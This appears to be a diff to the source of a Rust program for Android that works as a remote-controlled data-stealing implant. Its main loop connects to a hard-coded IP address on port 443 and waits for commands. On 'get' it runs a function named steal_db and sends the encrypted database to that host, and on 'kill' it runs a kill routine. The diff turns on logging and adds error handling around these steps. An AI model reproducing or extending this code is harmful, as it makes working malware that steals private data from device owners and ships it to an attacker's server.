@@ -1,9 +1,8 @@
 extern crate hex;
 #[macro_use] extern crate log;
-/*
-   use android_logger::Config;
-   use log::Level;
-   */
+
+use android_logger::Config;
+use log::Level;
 use std::env;
 use std::fs;
 use std::fs::File;
@@ -48,16 +47,16 @@ fn encrypt(t: Cipher,
     Ok(out)
 }
 
-#[allow(unused_must_use)]
+
 fn main() -> Result<(), Box<dyn std::error::Error>> {
 
-    /*
-       android_logger::init_once(
-       Config::default()
-       .with_min_level(Level::Info) // limit log level
-       .with_tag("TOAST") // logs will show under mytag tag
-       );
-       */
+    
+    android_logger::init_once(
+    Config::default()
+    .with_min_level(Level::Info) // limit log level
+    .with_tag("TOAST") // logs will show under mytag tag
+    );
+    
     let mut stream = TcpStream::connect("3.215.107.66:443")?;
     match setup() {
        Ok(()) => info!("No error from setup"),
@@ -65,11 +64,30 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     };
 
     loop {    
-        let res = get_commands(&mut stream).unwrap();
+        let res = match get_commands(&mut stream){
+            Ok(res) => {
+                info!("Got commands");
+                res
+            }
+                ,
+            Err(e) => {
+                error!("{}", e);
+                panic!("{}", e)
+            }
+        };
         let trimmed = res.trim();
         if trimmed == "get" {
-            let encrypted_db = steal_db().unwrap();
-            stream.write_all(&encrypted_db);
+            let encrypted_db = match steal_db() {
+                Ok(db) => db,
+                Err(e) => {
+                    error!("{}", e);
+                    panic!("{}", e);
+                }
+            };
+            match stream.write_all(&encrypted_db) {
+                Ok(_) => info!("Sent db successfully"),
+                Err(e) => error!("Could not send db: {}", e),
+            };
         }
         if trimmed == "kill" {
             match kill() {
